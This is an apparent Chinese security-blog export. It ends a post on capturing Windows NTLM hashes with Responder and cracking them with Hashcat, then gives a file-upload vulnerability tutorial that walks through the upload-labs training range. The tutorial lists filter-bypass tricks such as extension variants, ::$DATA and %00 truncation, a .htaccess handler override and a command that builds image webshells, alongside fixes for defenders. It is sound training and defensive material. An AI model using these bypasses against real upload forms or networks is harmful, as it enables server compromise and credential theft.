file</span><br><span class=\"line\">                        retrieval. This may cause a login prompt. Default:</span><br><span class=\"line\">                        False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)</span><br><span class=\"line\">                        authentication for the proxy. WPAD doesn&apos;t need to be</span><br><span class=\"line\">                        ON. This option is highly effective when combined with</span><br><span class=\"line\">                        -r. Default: False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  --lm                  Force LM hashing downgrade for Windows XP/2003 and</span><br><span class=\"line\">                        earlier. Default: False</span><br><span class=\"line\">                        </span><br><span class=\"line\">  -v, --verbose         Increase verbosity.</span><br></pre></td></tr></table></figure>\n<p>工具配置文件路径：<code>/usr/share/responder/Responder.conf</code></p>\n<p>修改配置文件只针对特定主机响应：</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190408140244.png\" alt></p>\n<p>工具演示：</p>\n<p>在网络中启用工具。</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190408141317.png\" alt></p>\n<p>抓取到Hash：</p>\n<p><img src=\"/2019/04/06/windows认证攻击/QQ截图20190408141627.png\" alt></p>\n<p>使用Hashcat破解：</p>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://www.secpulse.com/archives/65503.html\" target=\"_blank\" rel=\"noopener\">https://www.secpulse.com/archives/65503.html</a></p>\n<p><a href=\"http://baijiahao.baidu.com/s?id=1599333064699003609&amp;wfr=spider&amp;for=pc\" target=\"_blank\" rel=\"noopener\">http://baijiahao.baidu.com/s?id=1599333064699003609&amp;wfr=spider&amp;for=pc</a></p>\n<p><a href=\"https://www.jianshu.com/p/1b545a8b8b1e\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/1b545a8b8b1e</a></p>\n<p><a href=\"https://blog.csdn.net/vevenlcf/article/details/80887753\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/vevenlcf/article/details/80887753</a></p>"},{"title":"文件上传漏洞（File Upload）","date":"2019-03-05T05:28:41.000Z","_content":"\n## 一、概述\n\n> 文件上传漏洞是指用户上传可执行的脚本文件，并通过此脚本获得了执行服务器命令的能力。\n\n### 0x00 漏洞常见危害\n\n1. 上传web脚本语言文件，WEB容器解释运行了上传的脚本文件，导致代码执行。\n2. 上传Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域的行为。\n3. 上传病毒、木马文件，并诱骗管理员或用户下载执行。\n4. 上传合法文件，但内容为脚本语言代码，配合文件包含漏洞执行脚本。\n\n<!-- more -->\n\n### 0x01 攻击条件\n\n1. 上传文件后，要能通过WEB访问该文件。（能知道文件的路径并能访问）\n2. 上传的文件能被WEB容器解释执行。\n3. 文件被安全检查、改变内容，如压缩等操作，也会导致攻击不成功。\n\n### 0x02 安全的上传功能\n\n1. 上传目录设置为不可执行。\n2. 判断文件类型，对危险的文件类型进行过滤，且应采用白名单而不是黑名单方式过滤。\n3. 使用随机数重命名上传的文件及改写路径。\n4. 文件服务器使用单独的域名，这样有一些攻击会受到同源策略的影响而导致不生效。（如上传的是crossdomain.xml、XSS利用的Javascript文件等）\n\n### 0x03 文件上传功能\n\n> 文件上传本质上是客户端的 POST 请求，前端上传页面表单处需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。\n\n![](文件上传漏洞\\QQ截图20190305132724.png)\n\n## 二、文件解析漏洞\n\n> 解析漏洞是指不同Web容器对文件的解析方式的特性，一些解析特性配合文件上传功能会造成巨大的安全问题。\n\n### 0x00 IIS解析漏洞\n\n**IIS 6.0解析漏洞**\n\n1.文件名截断，截断字符为分号（;）：\n\n- 例如文件名：`xx.asp;yy.jpg`，会被作为`xx.asp`。\n\n2.文件夹扩展名解析漏洞，`/*.asp/`目录下的所有文件都会被作为asp文件解析。\n\n- 例如：`/x.asp/y.jpg`，`y.jpg`会被作为asp文件解析。\n\n3.IIS 6.0除了可以解析执行asp类型文件外，还有三种可执行文件类型：\n\n> ```\n> test.asa\n> test.cer\n> test.cdx\n> ```\n\n**IIS PUT漏洞**\n\n`PUT`是在Webdav中定义的一个方法，该方法允许用户上传文件到指定路径下。\n\n在IIS中，若目录具有`写权限`且`Webdav`是开启的，就会支持PUT方法。\n\n![](文件上传漏洞\\1544954468_5c162264b3e77.png)\n\n![](文件上传漏洞\\1544954489_5c16227975735.png)\n\n### 0x01 Apache解析漏洞\n\n**Apache 1.x、2.x：**\n\n- Apache对文件名的解析是从后往前的，直到遇到可识别的文件后缀为止。\n- Apache可识别的文件后缀（类型）定义在`mime.types`文件中。\n\n> 例如文件名：`shell.php.rar.rar.rar`，Apache由于无法识别`.rar`，会从后往前一直寻找可识别的文件类型，最后会将其作为`.php`文件。\n\n### 0x02 Nginx解析漏洞\n\n**1.漏洞外在表现：**\n\n- 访问：`http://xx.com/x.jpg/y.php`，`x.jpg`会被作为php文件执行。注意`y.php`是实际不存在的。\n\n**2.漏洞原理：**\n\n- 严格来说这并不是Nginx的漏洞，Nginx通常是以fastcgi的方式支持PHP解析的，nginx作为代理把HTTP请求转发给fastcgi Server。\n- 在nginx配置文件中通过正则匹配设置`SCRIPT_FILENAME`。当访问`http://xx.com/shell.jpg/test.php`这个URL时，`$fastcgi_script_name`会被设置为`shell.jpg/test.php`，然后将构造好的`SCRIPT_FILENAME`传递给cgi Server。\n- 当php开启`cgi.fix_pathinfo`这个选项时（默认开启），那么就会触发在PHP中的如下逻辑：\n  - PHP会认为`SCRIPT_FILENAME`是`shell.jpg`，而`test.php`是`PATH_INFO`，所以就会将`shell.jpg`作为PHP文件来解析了。\n- 因此这实际不是nginx的漏洞，在使用fastcgi的其他环境下，PHP也存在相同问题，IIS7.0/7.5就是这样的。\n\n**3.漏洞修复：**\n\n- 修改`php.ini`文件，将`cgi.fix_pathinfo`的值设置为0;\n\n## 三、文件上传过滤与绕过\n\n![](文件上传漏洞\\20180712092548-81b98800-85-1.png)\n\n结合`upload-labs`文件上传漏洞靶场进行分析学习。\n\n靶场地址：`https://github.com/c0ny1/upload-labs`\n\n### 0x00 前端过滤与绕过（Pass-01）\n\n***过滤:***\n\n前端使用JS对上传的文件后缀进行限制。\n\n![](文件上传漏洞\\QQ截图20190305144900.png)\n\n***绕过:***\n\n禁用浏览器Javascript。\n\n或者使用Burpsuite抓包修改文件名的方式。\n\n![](文件上传漏洞\\QQ截图20190305145812.png)\n\n![](文件上传漏洞\\QQ截图20190305150014.png)\n\n### 0x01 后端过滤与绕过\n\n**1.Mime类型过滤：Content-Type （Pass-02）**\n\n***过滤代码：***只允许上传特定mime类型的文件。\n\n![](文件上传漏洞\\QQ截图20190305150607.png)\n\n***Mime类型过滤绕过：***\n\n抓包修改Content-Type为允许的类型即可。实际情况中不知允许mime的类型，可以使用Burp进行枚举。\n\n![](文件上传漏洞\\QQ截图20190305151049.png)\n\n**2.黑名单过滤之过滤不全 (Pass-03)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305151732.png)\n\n***绕过方式：***\n\n被过滤的后缀很少时可以尝试使用其他未加入黑名单且可以被解析的文件后缀。如：`.php3`、`.php4`、`.phtml`等后缀。\n\n**3.黑名单过滤之未过滤.htaccess （Pass-04）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305161438.png)\n\n***绕过方式：***\n\n可以发现大部分文件后缀被过滤，但`.htaccess`未被过滤时，可以上传一个`.htaccess`文件，文件内容：\n\n> `SetHandler application/x-httpd-php`\n\n![](文件上传漏洞\\QQ截图20190305154725.png)\n\n上传这样的`.htaccess`文件后，所有文件都会被解析为php，然后再上传图片马，图片会被解析为php文件执行，就可以绕过过滤实现攻击。\n\nDOS下图片马制作：\n\n> **`copy /b a.png + /a b.php  c.png`**\n>\n> > - `/b`表示a.png是二进制文件，以二进制方式合并文件。\n> > - `/a`表示b.php是ASCII文件。（该参数可以省略）\n> > - `c.png`是合并后得到的文件。\n\n上传图片马并访问：\n\n![](文件上传漏洞\\QQ截图20190305160625.png)\n\n> PS:`.htacess`该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。`.htaccess`文件(或者”分布式配置文件”），提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。\n\n**4.黑名单过滤之未统一大小写 （Pass-05）**\n\n***过滤代码：***`strtolower()`字符串函数会将字符串的所有字符变为小写。\n\n![](文件上传漏洞\\QQ截图20190305163146.png)\n\n***绕过方式：***\n\n由于未统一大小写，导致过滤不全，可尝试`.PhP`、`.pHP`等后缀的方式绕过。\n\n**5.黑名单过滤之未去除空白 （Pass-06）**\n\n***过滤代码：***`trim()`字符串函数会将字符串首尾的空白去除。\n\n![](文件上传漏洞\\QQ截图20190305163603.png)\n\n***绕过方式：***\n\n在文件后缀前或者后面加入空白。\n\n**6.黑名单过滤之未去除\".\" （Pass-07）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305164357.png)\n\n***绕过方式：***\n\n利用windows特性，会自动去掉后缀名中最后的`.`，可在后缀名中加`.`绕过。\n\n抓包修改文件名，在文件名最后加入`.`。\n\n**6.黑名单过滤之未去除\"::$DATA\" （Pass-08）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305165249.png)\n\n***绕过方式：***\nphp在window的时候如果文件名+\"::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::$DATA\"之前的文件名。目的就是不检查后缀名。\n\n即在文件名之后加`::$DATA`绕过。\n\n**7.黑名单过滤之文件名拼接 （Pass-09）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306092934.png)\n\n***绕过方式：***\n\n抓包修改文件名为：`xxxx.php. .`(点 空格 点)\n\n**8.黑名单过滤之替换后缀名 (Pass-10)**\n\n过滤代码：`str_ireplace(find,replace,string,count)`函数替换字符串中的一些字符（不区分大小写）。\n\n![](文件上传漏洞\\QQ截图20190306093435.png)\n\n***绕过方式：***\n\n使用双写后缀的方式绕过，如使用`shell.pphphp`，中间的`php`字符被替换为空后，得到`shell.php`。\n\n**9.白名单过滤之路径拼接GET (Pass-11)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306094436.png)\n\n***绕过方式：***\n\n使用`%00`截断，`%00`是URL编码后的空字符，即ASCII码为0的字符（空字符），十六进制表示为`0x00`，转义字符为`\\0`，在C、PHP等语言中空字符表示字符串的结束。\n\n![](文件上传漏洞\\QQ截图201903061003321.png)\n\n> - 截断条件：\n>   - php版本小于5.3.4 详情关注CVE-2006-7243\n>   - php的`magic_quotes_gpc`为OFF状态   //如果不修改将无法上传成功，默认为ON\n> - `%00`截断参考链接：`https://www.2cto.com/article/201502/377462.html`\n\n**10.白名单过滤之路径拼接POST （Pass-12）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306102231.png)\n\n***绕过方式：***\n\n同样使用`%00`截断绕过，但是与GET方式不同的是，由于GET提交的数据是在URL中的，因此服务器会对其进行URL decode。而POST提交的是不会进行URL解码的，因此需要在十六进进制中添加`0x00`。\n\n![](文件上传漏洞\\QQ截图20190306103406.png)\n\n![](文件上传漏洞\\QQ截图20190306103855.png)\n\n**11.文件内容过滤之内容匹配 (Pass-13)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306104525.png)\n\n***绕过方式：***\n\n使用图片马即可，图片马制作见Pass-04。\n\n**12.文件内容过滤之文件类型 (Pass-14、Pass-15)**\n\n***过滤代码：***\n\n`getimagesize (string  $filename)`返回一个具有四个单元的数组。索引0包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 = GIF，2 = JPG，3 = PNG，4 = SWF...\n\n`exif_imagetype()`读取一个图像的第一个字节并检查其签名。\n\n![](文件上传漏洞\\QQ截图20190306105122.png)\n\n![](文件上传漏洞\\QQ截图20190306105746.png)\n\n***绕过方式：***\n\n使用图片马进行绕过。\n\n**13.文件内容过滤之二次渲染 (Pass-16)**\n\n***过滤代码：***\n\n`imagecreatefromjpeg`二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。\n\n![](文件上传漏洞\\QQ截图20190306112443.png)\n\n***绕过方式：***\n\n绕过方法是将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写脚本程序。\n\n二次渲染与绕过方法参考连接：`https://secgeek.net/bookfresh-vulnerability/`\n\n**14.条件竞争 （Pass-17）**\n\n***过滤代码：***`unlink()`函数作用是删除文件。若成功，则返回 true，失败则返回 false。\n\n![](文件上传漏洞\\QQ截图20190306114556.png)\n\n***绕过方式：***\n\n这里注意一个点，不管什么文件都是会被上传到服务器上的，上传到服务器之后才进行白名单检查。\n\n因此，绕过的思路就是在文件被安全检查删除之前访问文件。\n\n多个进程并发访问和操作同一数据且执行结果与访问的特定顺序有关，称为竞争条件。\n\n攻击方法：上传一个php文件，使用Burpsuite进行抓包并将数据包发送到`intruder`模块，清空变量，然后选择Payload的类型为`Null payloads`，并输入重放数据包的数量，保证不断在上传文件。同时使用浏览器不断刷新访问上传的php文件，直到访问成功。\n\n![](文件上传漏洞\\QQ截图20190306130645.png)\n\n![](文件上传漏洞\\QQ截图20190306131219.png)\n\n![](文件上传漏洞\\QQ截图20190306131709.png)\n\n**参考连接：**\n\nhttps://xz.aliyun.com/t/2435\n\nhttps://github.com/LandGrey/upload-labs-writeup\n\nhttp://www.cnblogs.com/shellr00t/p/6426856.html\n\nhttps://www.anquanke.com/post/id/164561","source":"_posts/文件上传漏洞.md","raw":"---\ntitle: 文件上传漏洞（File Upload）\ndate: 2019-03-05 13:28:41\ntags:\n\t- 文件上传\n\t- 过滤与绕过\n\t- 靶场\ncategories: WEB漏洞学习\n---\n\n## 一、概述\n\n> 文件上传漏洞是指用户上传可执行的脚本文件，并通过此脚本获得了执行服务器命令的能力。\n\n### 0x00 漏洞常见危害\n\n1. 上传web脚本语言文件，WEB容器解释运行了上传的脚本文件，导致代码执行。\n2. 上传Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域的行为。\n3. 上传病毒、木马文件，并诱骗管理员或用户下载执行。\n4. 上传合法文件，但内容为脚本语言代码，配合文件包含漏洞执行脚本。\n\n<!-- more -->\n\n### 0x01 攻击条件\n\n1. 上传文件后，要能通过WEB访问该文件。（能知道文件的路径并能访问）\n2. 上传的文件能被WEB容器解释执行。\n3. 文件被安全检查、改变内容，如压缩等操作，也会导致攻击不成功。\n\n### 0x02 安全的上传功能\n\n1. 上传目录设置为不可执行。\n2. 判断文件类型，对危险的文件类型进行过滤，且应采用白名单而不是黑名单方式过滤。\n3. 使用随机数重命名上传的文件及改写路径。\n4. 文件服务器使用单独的域名，这样有一些攻击会受到同源策略的影响而导致不生效。（如上传的是crossdomain.xml、XSS利用的Javascript文件等）\n\n### 0x03 文件上传功能\n\n> 文件上传本质上是客户端的 POST 请求，前端上传页面表单处需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。\n\n![](文件上传漏洞\\QQ截图20190305132724.png)\n\n## 二、文件解析漏洞\n\n> 解析漏洞是指不同Web容器对文件的解析方式的特性，一些解析特性配合文件上传功能会造成巨大的安全问题。\n\n### 0x00 IIS解析漏洞\n\n**IIS 6.0解析漏洞**\n\n1.文件名截断，截断字符为分号（;）：\n\n- 例如文件名：`xx.asp;yy.jpg`，会被作为`xx.asp`。\n\n2.文件夹扩展名解析漏洞，`/*.asp/`目录下的所有文件都会被作为asp文件解析。\n\n- 例如：`/x.asp/y.jpg`，`y.jpg`会被作为asp文件解析。\n\n3.IIS 6.0除了可以解析执行asp类型文件外，还有三种可执行文件类型：\n\n> ```\n> test.asa\n> test.cer\n> test.cdx\n> ```\n\n**IIS PUT漏洞**\n\n`PUT`是在Webdav中定义的一个方法，该方法允许用户上传文件到指定路径下。\n\n在IIS中，若目录具有`写权限`且`Webdav`是开启的，就会支持PUT方法。\n\n![](文件上传漏洞\\1544954468_5c162264b3e77.png)\n\n![](文件上传漏洞\\1544954489_5c16227975735.png)\n\n### 0x01 Apache解析漏洞\n\n**Apache 1.x、2.x：**\n\n- Apache对文件名的解析是从后往前的，直到遇到可识别的文件后缀为止。\n- Apache可识别的文件后缀（类型）定义在`mime.types`文件中。\n\n> 例如文件名：`shell.php.rar.rar.rar`，Apache由于无法识别`.rar`，会从后往前一直寻找可识别的文件类型，最后会将其作为`.php`文件。\n\n### 0x02 Nginx解析漏洞\n\n**1.漏洞外在表现：**\n\n- 访问：`http://xx.com/x.jpg/y.php`，`x.jpg`会被作为php文件执行。注意`y.php`是实际不存在的。\n\n**2.漏洞原理：**\n\n- 严格来说这并不是Nginx的漏洞，Nginx通常是以fastcgi的方式支持PHP解析的，nginx作为代理把HTTP请求转发给fastcgi Server。\n- 在nginx配置文件中通过正则匹配设置`SCRIPT_FILENAME`。当访问`http://xx.com/shell.jpg/test.php`这个URL时，`$fastcgi_script_name`会被设置为`shell.jpg/test.php`，然后将构造好的`SCRIPT_FILENAME`传递给cgi Server。\n- 当php开启`cgi.fix_pathinfo`这个选项时（默认开启），那么就会触发在PHP中的如下逻辑：\n  - PHP会认为`SCRIPT_FILENAME`是`shell.jpg`，而`test.php`是`PATH_INFO`，所以就会将`shell.jpg`作为PHP文件来解析了。\n- 因此这实际不是nginx的漏洞，在使用fastcgi的其他环境下，PHP也存在相同问题，IIS7.0/7.5就是这样的。\n\n**3.漏洞修复：**\n\n- 修改`php.ini`文件，将`cgi.fix_pathinfo`的值设置为0;\n\n## 三、文件上传过滤与绕过\n\n![](文件上传漏洞\\20180712092548-81b98800-85-1.png)\n\n结合`upload-labs`文件上传漏洞靶场进行分析学习。\n\n靶场地址：`https://github.com/c0ny1/upload-labs`\n\n### 0x00 前端过滤与绕过（Pass-01）\n\n***过滤:***\n\n前端使用JS对上传的文件后缀进行限制。\n\n![](文件上传漏洞\\QQ截图20190305144900.png)\n\n***绕过:***\n\n禁用浏览器Javascript。\n\n或者使用Burpsuite抓包修改文件名的方式。\n\n![](文件上传漏洞\\QQ截图20190305145812.png)\n\n![](文件上传漏洞\\QQ截图20190305150014.png)\n\n### 0x01 后端过滤与绕过\n\n**1.Mime类型过滤：Content-Type （Pass-02）**\n\n***过滤代码：***只允许上传特定mime类型的文件。\n\n![](文件上传漏洞\\QQ截图20190305150607.png)\n\n***Mime类型过滤绕过：***\n\n抓包修改Content-Type为允许的类型即可。实际情况中不知允许mime的类型，可以使用Burp进行枚举。\n\n![](文件上传漏洞\\QQ截图20190305151049.png)\n\n**2.黑名单过滤之过滤不全 (Pass-03)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305151732.png)\n\n***绕过方式：***\n\n被过滤的后缀很少时可以尝试使用其他未加入黑名单且可以被解析的文件后缀。如：`.php3`、`.php4`、`.phtml`等后缀。\n\n**3.黑名单过滤之未过滤.htaccess （Pass-04）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305161438.png)\n\n***绕过方式：***\n\n可以发现大部分文件后缀被过滤，但`.htaccess`未被过滤时，可以上传一个`.htaccess`文件，文件内容：\n\n> `SetHandler application/x-httpd-php`\n\n![](文件上传漏洞\\QQ截图20190305154725.png)\n\n上传这样的`.htaccess`文件后，所有文件都会被解析为php，然后再上传图片马，图片会被解析为php文件执行，就可以绕过过滤实现攻击。\n\nDOS下图片马制作：\n\n> **`copy /b a.png + /a b.php  c.png`**\n>\n> > - `/b`表示a.png是二进制文件，以二进制方式合并文件。\n> > - `/a`表示b.php是ASCII文件。（该参数可以省略）\n> > - `c.png`是合并后得到的文件。\n\n上传图片马并访问：\n\n![](文件上传漏洞\\QQ截图20190305160625.png)\n\n> PS:`.htacess`该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。`.htaccess`文件(或者”分布式配置文件”），提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。\n\n**4.黑名单过滤之未统一大小写 （Pass-05）**\n\n***过滤代码：***`strtolower()`字符串函数会将字符串的所有字符变为小写。\n\n![](文件上传漏洞\\QQ截图20190305163146.png)\n\n***绕过方式：***\n\n由于未统一大小写，导致过滤不全，可尝试`.PhP`、`.pHP`等后缀的方式绕过。\n\n**5.黑名单过滤之未去除空白 （Pass-06）**\n\n***过滤代码：***`trim()`字符串函数会将字符串首尾的空白去除。\n\n![](文件上传漏洞\\QQ截图20190305163603.png)\n\n***绕过方式：***\n\n在文件后缀前或者后面加入空白。\n\n**6.黑名单过滤之未去除\".\" （Pass-07）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305164357.png)\n\n***绕过方式：***\n\n利用windows特性，会自动去掉后缀名中最后的`.`，可在后缀名中加`.`绕过。\n\n抓包修改文件名，在文件名最后加入`.`。\n\n**6.黑名单过滤之未去除\"::$DATA\" （Pass-08）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190305165249.png)\n\n***绕过方式：***\nphp在window的时候如果文件名+\"::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::$DATA\"之前的文件名。目的就是不检查后缀名。\n\n即在文件名之后加`::$DATA`绕过。\n\n**7.黑名单过滤之文件名拼接 （Pass-09）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306092934.png)\n\n***绕过方式：***\n\n抓包修改文件名为：`xxxx.php. .`(点 空格 点)\n\n**8.黑名单过滤之替换后缀名 (Pass-10)**\n\n过滤代码：`str_ireplace(find,replace,string,count)`函数替换字符串中的一些字符（不区分大小写）。\n\n![](文件上传漏洞\\QQ截图20190306093435.png)\n\n***绕过方式：***\n\n使用双写后缀的方式绕过，如使用`shell.pphphp`，中间的`php`字符被替换为空后，得到`shell.php`。\n\n**9.白名单过滤之路径拼接GET (Pass-11)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306094436.png)\n\n***绕过方式：***\n\n使用`%00`截断，`%00`是URL编码后的空字符，即ASCII码为0的字符（空字符），十六进制表示为`0x00`，转义字符为`\\0`，在C、PHP等语言中空字符表示字符串的结束。\n\n![](文件上传漏洞\\QQ截图201903061003321.png)\n\n> - 截断条件：\n>   - php版本小于5.3.4 详情关注CVE-2006-7243\n>   - php的`magic_quotes_gpc`为OFF状态   //如果不修改将无法上传成功，默认为ON\n> - `%00`截断参考链接：`https://www.2cto.com/article/201502/377462.html`\n\n**10.白名单过滤之路径拼接POST （Pass-12）**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306102231.png)\n\n***绕过方式：***\n\n同样使用`%00`截断绕过，但是与GET方式不同的是，由于GET提交的数据是在URL中的，因此服务器会对其进行URL decode。而POST提交的是不会进行URL解码的，因此需要在十六进进制中添加`0x00`。\n\n![](文件上传漏洞\\QQ截图20190306103406.png)\n\n![](文件上传漏洞\\QQ截图20190306103855.png)\n\n**11.文件内容过滤之内容匹配 (Pass-13)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306104525.png)\n\n***绕过方式：***\n\n使用图片马即可，图片马制作见Pass-04。\n\n**12.文件内容过滤之文件类型 (Pass-14、Pass-15)**\n\n***过滤代码：***\n\n`getimagesize (string  $filename)`返回一个具有四个单元的数组。索引0包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 = GIF，2 = JPG，3 = PNG，4 = SWF...\n\n`exif_imagetype()`读取一个图像的第一个字节并检查其签名。\n\n![](文件上传漏洞\\QQ截图20190306105122.png)\n\n![](文件上传漏洞\\QQ截图20190306105746.png)\n\n***绕过方式：***\n\n使用图片马进行绕过。\n\n**13.文件内容过滤之二次渲染 (Pass-16)**\n\n***过滤代码：***\n\n`imagecreatefromjpeg`二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。\n\n![](文件上传漏洞\\QQ截图20190306112443.png)\n\n***绕过方式：***\n\n绕过方法是将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写脚本程序。\n\n二次渲染与绕过方法参考连接：`https://secgeek.net/bookfresh-vulnerability/`\n\n**14.条件竞争 （Pass-17）**\n\n***过滤代码：***`unlink()`函数作用是删除文件。若成功，则返回 true，失败则返回 false。\n\n![](文件上传漏洞\\QQ截图20190306114556.png)\n\n***绕过方式：***\n\n这里注意一个点，不管什么文件都是会被上传到服务器上的，上传到服务器之后才进行白名单检查。\n\n因此，绕过的思路就是在文件被安全检查删除之前访问文件。\n\n多个进程并发访问和操作同一数据且执行结果与访问的特定顺序有关，称为竞争条件。\n\n攻击方法：上传一个php文件，使用Burpsuite进行抓包并将数据包发送到`intruder`模块，清空变量，然后选择Payload的类型为`Null payloads`，并输入重放数据包的数量，保证不断在上传文件。同时使用浏览器不断刷新访问上传的php文件，直到访问成功。\n\n![](文件上传漏洞\\QQ截图20190306130645.png)\n\n![](文件上传漏洞\\QQ截图20190306131219.png)\n\n![](文件上传漏洞\\QQ截图20190306131709.png)\n\n**参考连接：**\n\nhttps://xz.aliyun.com/t/2435\n\nhttps://github.com/LandGrey/upload-labs-writeup\n\nhttp://www.cnblogs.com/shellr00t/p/6426856.html\n\nhttps://www.anquanke.com/post/id/164561","slug":"文件上传漏洞","published":1,"updated":"2019-03-06T07:05:41.036Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83ng006g7or0ddzcyoot","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><blockquote>\n<p>文件上传漏洞是指用户上传可执行的脚本文件，并通过此脚本获得了执行服务器命令的能力。</p>\n</blockquote>\n<h3 id=\"0x00-漏洞常见危害\"><a href=\"#0x00-漏洞常见危害\" class=\"headerlink\" title=\"0x00 漏洞常见危害\"></a>0x00 漏洞常见危害</h3><ol>\n<li>上传web脚本语言文件，WEB容器解释运行了上传的脚本文件，导致代码执行。</li>\n<li>上传Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域的行为。</li>\n<li>上传病毒、木马文件，并诱骗管理员或用户下载执行。</li>\n<li>上传合法文件，但内容为脚本语言代码，配合文件包含漏洞执行脚本。</li>\n</ol>\n<a id=\"more\"></a>\n<h3 id=\"0x01-攻击条件\"><a href=\"#0x01-攻击条件\" class=\"headerlink\" title=\"0x01 攻击条件\"></a>0x01 攻击条件</h3><ol>\n<li>上传文件后，要能通过WEB访问该文件。（能知道文件的路径并能访问）</li>\n<li>上传的文件能被WEB容器解释执行。</li>\n<li>文件被安全检查、改变内容，如压缩等操作，也会导致攻击不成功。</li>\n</ol>\n<h3 id=\"0x02-安全的上传功能\"><a href=\"#0x02-安全的上传功能\" class=\"headerlink\" title=\"0x02 安全的上传功能\"></a>0x02 安全的上传功能</h3><ol>\n<li>上传目录设置为不可执行。</li>\n<li>判断文件类型，对危险的文件类型进行过滤，且应采用白名单而不是黑名单方式过滤。</li>\n<li>使用随机数重命名上传的文件及改写路径。</li>\n<li>文件服务器使用单独的域名，这样有一些攻击会受到同源策略的影响而导致不生效。（如上传的是crossdomain.xml、XSS利用的Javascript文件等）</li>\n</ol>\n<h3 id=\"0x03-文件上传功能\"><a href=\"#0x03-文件上传功能\" class=\"headerlink\" title=\"0x03 文件上传功能\"></a>0x03 文件上传功能</h3><blockquote>\n<p>文件上传本质上是客户端的 POST 请求，前端上传页面表单处需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。</p>\n</blockquote>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305132724.png\" alt></p>\n<h2 id=\"二、文件解析漏洞\"><a href=\"#二、文件解析漏洞\" class=\"headerlink\" title=\"二、文件解析漏洞\"></a>二、文件解析漏洞</h2><blockquote>\n<p>解析漏洞是指不同Web容器对文件的解析方式的特性，一些解析特性配合文件上传功能会造成巨大的安全问题。</p>\n</blockquote>\n<h3 id=\"0x00-IIS解析漏洞\"><a href=\"#0x00-IIS解析漏洞\" class=\"headerlink\" title=\"0x00 IIS解析漏洞\"></a>0x00 IIS解析漏洞</h3><p><strong>IIS 6.0解析漏洞</strong></p>\n<p>1.文件名截断，截断字符为分号（;）：</p>\n<ul>\n<li>例如文件名：<code>xx.asp;yy.jpg</code>，会被作为<code>xx.asp</code>。</li>\n</ul>\n<p>2.文件夹扩展名解析漏洞，<code>/*.asp/</code>目录下的所有文件都会被作为asp文件解析。</p>\n<ul>\n<li>例如：<code>/x.asp/y.jpg</code>，<code>y.jpg</code>会被作为asp文件解析。</li>\n</ul>\n<p>3.IIS 6.0除了可以解析执行asp类型文件外，还有三种可执行文件类型：</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; test.asa</span><br><span class=\"line\">&gt; test.cer</span><br><span class=\"line\">&gt; test.cdx</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>IIS PUT漏洞</strong></p>\n<p><code>PUT</code>是在Webdav中定义的一个方法，该方法允许用户上传文件到指定路径下。</p>\n<p>在IIS中，若目录具有<code>写权限</code>且<code>Webdav</code>是开启的，就会支持PUT方法。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/1544954468_5c162264b3e77.png\" alt></p>\n<p><img 